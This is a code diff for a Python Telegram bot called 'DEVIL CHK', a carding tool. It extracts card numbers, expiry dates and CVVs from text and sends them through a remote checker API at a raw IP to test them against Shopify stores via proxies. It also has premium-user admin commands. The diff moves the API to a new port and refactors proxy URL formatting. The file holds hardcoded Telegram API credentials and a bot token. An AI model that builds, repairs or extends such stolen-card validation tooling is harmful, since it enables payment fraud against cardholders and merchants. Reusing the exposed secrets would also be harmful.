@@ -13,7 +13,9 @@ API_ID = 39825025
 API_HASH = '47170fd9a11b3f591bbc56849519f0f8'
 BOT_TOKEN = '8827673793:AAHFpHDHGCwBpn2MpQf61G4N-1ebDz1bFSw'
 ADMIN_ID = [1707478010]
-CHECKER_API_URL = 'http://187.77.70.6:5000/shopify'
+
+# الـ API الجديد الخاص بك (يجب تغيير IP_YOUR_SERVER إلى الآيبي الفعلي الخاص بسيرفرك)
+CHECKER_API_URL = 'http://187.77.70.6:5001/shopify'
 
 PREMIUM_USERS_FILE = "premium_users.txt"
 SITES_FILE = 'sites.txt'
@@ -174,6 +176,22 @@ def extract_cc(text):
         cards.append(f"{card}|{month}|{year}|{cvv}")
     return cards
 
+# دالة مساعدة لتشكيل صيغة البروكسي كرابط بالكامل لتتوافق مع السيرفر الجديد
+def format_proxy_url(proxy_str):
+    if not proxy_str:
+        return None
+    proxy_parts = proxy_str.split(':')
+    if len(proxy_parts) == 4:
+        ip, port, user, password = proxy_parts
+        return f"http://{user}:{password}@{ip}:{port}"
+    elif len(proxy_parts) == 2:
+        ip, port = proxy_parts
+        return f"http://{ip}:{port}"
+    else:
+        if not proxy_str.startswith('http'):
+            return f"http://{proxy_str}"
+        return proxy_str
+
 async def check_card(card, site, proxy):
     try:
         clean_card = card.replace('{', '').replace('}', '').strip()
@@ -184,24 +202,24 @@ async def check_card(card, site, proxy):
 
         if not site.startswith('http'):
             site = f'https://{site}'
+        if not site.endswith('/'):
+            site = f'{site}/'
 
-        proxy_str = None
-        if proxy:
-            proxy_parts = proxy.split(':')
-            if len(proxy_parts) >= 2:
-                proxy_str = proxy 
+        # تجهيز رابط البروكسي بالصيغة المطلوبة للسيرفر الجديد
+        formatted_proxy = format_proxy_url(proxy)
 
-        # تعديل صيغة المعاملات هنا لتطابق طلبك تماماً
+        # ترتيب وإعداد البارامترات المطلوبة بدقة
         params = {
-            'cc': clean_card,
-            'site': site
+            'site': site,
+            'cc': clean_card
         }
-        if proxy_str:
-            params['proxy'] = proxy_str
+        if formatted_proxy:
+            params['proxy'] = formatted_proxy
 
         timeout = aiohttp.ClientTimeout(total=100)
 
         async with aiohttp.ClientSession(timeout=timeout) as session:
+            # استخدام البارامترات تلقائياً ليقوم aiohttp بوضع علامة ? وبناء الرابط بدقة
             async with session.get(CHECKER_API_URL, params=params) as resp:
                 if resp.status != 200:
                     return {'status': 'Site Error', 'message': f'HTTP {resp.status}', 'card': card, 'retry': True}
@@ -374,25 +392,21 @@ async def test_site(site, proxy):
     try:
         if not site.startswith('http'):
             site = f'https://{site}'
+        if not site.endswith('/'):
+            site = f'{site}/'
 
-        proxy_str = None
-        if proxy:
-            proxy_parts = proxy.split(':')
-            if len(proxy_parts) == 4:
-                ip, port, user, password = proxy_parts
-                proxy_str = f"{ip}:{port}:{user}:{password}"
-            elif len(proxy_parts) == 2:
-                ip, port = proxy_parts
-                proxy_str = f"{ip}:{port}"
+        formatted_proxy = format_proxy_url(proxy)
 
-        # تعديل الترتيب هنا أيضاً في فحص الموقع الفرعي ليتطابق مع الـ API الجديد
-        url = f'{CHECKER_API_URL}?cc={test_card}&site={site}'
-        if proxy_str:
-            url += f'&proxy={proxy_str}'
+        params = {
+            'site': site,
+            'cc': test_card
+        }
+        if formatted_proxy:
+            params['proxy'] = formatted_proxy
 
         timeout = aiohttp.ClientTimeout(total=60)
         async with aiohttp.ClientSession(timeout=timeout) as session:
-            async with session.get(url) as resp:
+            async with session.get(CHECKER_API_URL, params=params) as resp:
                 if resp.status != 200:
                     return {'site': site, 'status': 'dead'}
                 try:
@@ -413,16 +427,7 @@ async def test_site(site, proxy):
 
 async def test_proxy(proxy):
     try:
-        proxy_parts = proxy.split(':')
-        if len(proxy_parts) == 4:
-            ip, port, user, password = proxy_parts
-            proxy_url = f'http://{user}:{password}@{ip}:{port}'
-        elif len(proxy_parts) == 2:
-            ip, port = proxy_parts
-            proxy_url = f'http://{ip}:{port}'
-        else:
-            proxy_url = f'http://{proxy}'
-
+        proxy_url = format_proxy_url(proxy)
         timeout = aiohttp.ClientTimeout(total=15)
         async with aiohttp.ClientSession(timeout=timeout) as session:
             async with session.get('https://www.shopify.com', proxy=proxy_url) as res:
@@ -480,7 +485,7 @@ async def admin_panel_callback(event):
 
     admin_text = """<b>⚡💳 ㅤ#𝐃𝐄𝐕𝐈𝐋 𝐂𝐇𝐊  💳⚡</b>
 <b>━━━━━━━━━━━━━━━━━</b>
-<b>⚡💠 𝐀𝐝𝐦𝐢𝐧 𝐏𝐚𝐧𝐞𝐥</b>
+<b>⚡💠 𝐀𝐝𝐦𝐢𝐧 𝐏𝐚ν𝐞𝐥</b>
 <blockquote>• /addpremium id - Add premium user
 • /removepremium id - Remove premium user
 • /listpremium - List premium users
